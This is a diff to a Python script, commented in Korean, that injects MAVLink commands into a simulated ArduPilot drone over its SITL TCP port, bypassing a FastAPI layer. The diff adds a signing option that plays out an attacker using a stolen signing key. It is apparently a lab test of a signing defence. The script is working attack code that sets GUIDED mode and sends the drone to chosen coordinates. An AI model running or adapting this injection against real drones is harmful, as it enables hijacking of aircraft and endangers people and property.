@@ -1,6 +1,13 @@
 #!/usr/bin/env python3
-"""V1 공격: Windows에서 SITL TCP 포트에 직접 MAVLink 주입 (FastAPI 우회)."""
+"""V1 공격: Windows에서 SITL TCP 포트에 직접 MAVLink 주입 (FastAPI 우회).
+
+서명 옵션:
+  --no-sign          서명 없이 주입 (기본값, 방어 전 공격 / 방어 후 거부 확인용)
+  --sign             서명 키를 갖고 있는 공격자 시나리오 (키 탈취 후 재공격)
+  --key-file PATH    서명 키 파일 경로 (기본: signing.key)
+"""
 import argparse
+import sys
 import time
 from pymavlink import mavutil
 
@@ -11,11 +18,28 @@ COPTER_MODES = {0:"STABILIZE",3:"AUTO",4:"GUIDED",5:"LOITER",6:"RTL",9:"LAND"}
 ACK_RESULTS  = {0:"ACCEPTED",1:"TEMPORARILY_REJECTED",2:"DENIED",3:"UNSUPPORTED",4:"FAILED",5:"IN_PROGRESS"}
 
 
+# ── 서명 키 로드 ──────────────────────────────────────────────────────────────
+
+def load_key(path: str) -> bytes:
+    try:
+        with open(path, "rb") as f:
+            key = f.read()
+        if len(key) != 32:
+            print(f"[ERROR] 키 파일 크기가 32바이트가 아닙니다 ({len(key)}바이트): {path}")
+            sys.exit(1)
+        return key
+    except FileNotFoundError:
+        print(f"[ERROR] 키 파일 없음: {path}")
+        print(f"        먼저 python scripts/generate_key.py 를 실행하세요.")
+        sys.exit(1)
+
+
 # ── 연결 ─────────────────────────────────────────────────────────────────────
 
-def connect(drone_id: str) -> mavutil.mavfile:
+def connect(drone_id: str, sign_key: bytes | None = None) -> mavutil.mavfile:
     port = DRONE_PORTS[drone_id]
-    print(f"[CONNECT] {drone_id} @ {SITL_HOST}:{port} ...")
+    signed = "서명 있음" if sign_key else "무서명"
+    print(f"[CONNECT] {drone_id} @ {SITL_HOST}:{port}  [{signed}]")
     conn = mavutil.mavlink_connection(f"tcp:{SITL_HOST}:{port}", source_system=255)
 
     hb = conn.wait_heartbeat(timeout=10)
@@ -31,6 +55,15 @@ def connect(drone_id: str) -> mavutil.mavfile:
     print(f"[READY]   sysid={actual_sysid} compid={conn.target_component}")
     print(f"[STATE]   mode={mode_name}({mode_num})  armed={armed}")
     print(f"[DEBUG]   MAVLink version={hb.mavlink_version}  autopilot={hb.autopilot}")
+
+    # 서명 키가 있으면 setup_signing으로 활성화 (키 탈취 후 재공격 시나리오)
+    if sign_key is not None:
+        conn.setup_signing(
+            secret_key=sign_key,
+            sign_outgoing=True,
+            allow_unsigned=True,
+        )
+        print(f"[SIGN]    서명 활성화 완료 (key={sign_key.hex()[:16]}...)")
 
     # target_system은 wait_heartbeat()가 설정한 값 그대로 사용
     conn.target_component = 1
@@ -137,11 +170,12 @@ def wait_ack(conn: mavutil.mavfile, timeout: float = 5.0) -> bool:
 
 # ── 전체 공격 시퀀스 ──────────────────────────────────────────────────────────
 
-def attack_sequence(drone_id: str, lat: float, lon: float, alt: float) -> None:
+def attack_sequence(drone_id: str, lat: float, lon: float, alt: float,
+                    sign_key: bytes | None = None) -> None:
     print(f"\n=== 전체 공격 시퀀스 ===")
     print(f"대상: {drone_id}  목표: lat={lat:.6f} lon={lon:.6f} alt={alt}m\n")
 
-    conn = connect(drone_id)
+    conn = connect(drone_id, sign_key)
 
     print(f"\n[STEP 1] GUIDED 모드 설정")
     send_cmd(conn, "GUIDED", {})
@@ -179,17 +213,31 @@ def main():
     ap.add_argument("--lat",   type=float, default=37.566535)
     ap.add_argument("--lon",   type=float, default=126.977969)
     ap.add_argument("--alt",   type=float, default=30.0)
+
+    sign_group = ap.add_mutually_exclusive_group()
+    sign_group.add_argument("--sign",    action="store_true",
+                            help="서명 키를 사용해 주입 (키 탈취 시나리오)")
+    sign_group.add_argument("--no-sign", action="store_true", default=True,
+                            help="무서명 주입 (기본값, 방어 후 거부 확인용)")
+    ap.add_argument("--key-file", default="signing.key",
+                    help="서명 키 파일 경로 (--sign 사용 시, 기본: signing.key)")
     args = ap.parse_args()
 
+    sign_key = None
+    if args.sign:
+        sign_key = load_key(args.key_file)
+        print(f"[SIGN]  키 로드 완료: {args.key_file} ({sign_key.hex()[:16]}...)")
+
     if args.cmd == "SEQUENCE":
-        attack_sequence(args.drone, args.lat, args.lon, args.alt)
+        attack_sequence(args.drone, args.lat, args.lon, args.alt, sign_key)
         return
 
+    signed_label = f"서명 있음 ({args.key_file})" if sign_key else "무서명"
     print(f"\n=== V1 공격 스크립트 ===")
-    print(f"대상: {args.drone}  명령: {args.cmd}")
+    print(f"대상: {args.drone}  명령: {args.cmd}  [{signed_label}]")
     print(f"경로: Windows(192.168.56.1) → SITL({SITL_HOST}:{DRONE_PORTS[args.drone]}) [FastAPI 우회]\n")
 
-    conn = connect(args.drone)
+    conn = connect(args.drone, sign_key)
     send_cmd(conn, args.cmd, {"lat": args.lat, "lon": args.lon, "alt": args.alt})
 
     # 명령 전송 후 3초간 오는 모든 메시지 출력 (핵심 디버그)
